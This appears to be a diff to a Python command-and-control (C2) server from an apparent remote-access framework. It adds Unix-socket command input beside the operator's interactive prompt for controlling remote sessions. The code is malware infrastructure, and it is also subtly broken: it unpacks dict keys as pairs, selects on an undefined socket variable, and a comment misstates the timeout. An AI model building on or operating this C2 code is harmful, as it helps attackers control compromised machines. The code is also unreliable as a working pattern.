@@ -454,7 +454,22 @@ class C2():
 
     def _get_prompt(self, data):
         with self._lock:
-            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
+            # iterate the unix sockets looking for a command
+            for num, socket in self.unix_sockets:
+                # Use select to wait for a connection with a timeout
+                readable, _, _ = select.select([server_socket], [], [], 0.5)  # 1-second timeout
+                if not readable:
+                    continue
+
+                conn, _ = socket.accept()
+                print(f"connected to unix client {num}")
+
+                data = conn.recv(1024).decode("utf-8")
+                
+                return data, conn
+
+            # Get prompt from the users input
+            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip()), None
 
     def _execute(self, args):
         # ugly method that should be refactored at some point
@@ -990,7 +1005,7 @@ class C2():
 
                     # Listen for incoming connections
                     server_socket.listen(1)
-                    print(f"Server listening on {SOCKET_PATH}")
+                    print(f"Unix server listening on {SOCKET_PATH}")
 
                     self.unix_sockets[int(session.id)] = server_socket
 
@@ -1219,7 +1234,7 @@ class Session(threading.Thread):
                         self._active.set()
                     elif 'prompt' in task.get('task'):
                         self._prompt = task
-                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
+                        command, conn = globals()['c2']._get_prompt(task.get('result') % int(self.id))
                         cmd, _, action  = command.partition(' ')
                         if cmd in ('\n', ' ', ''):
                             continue
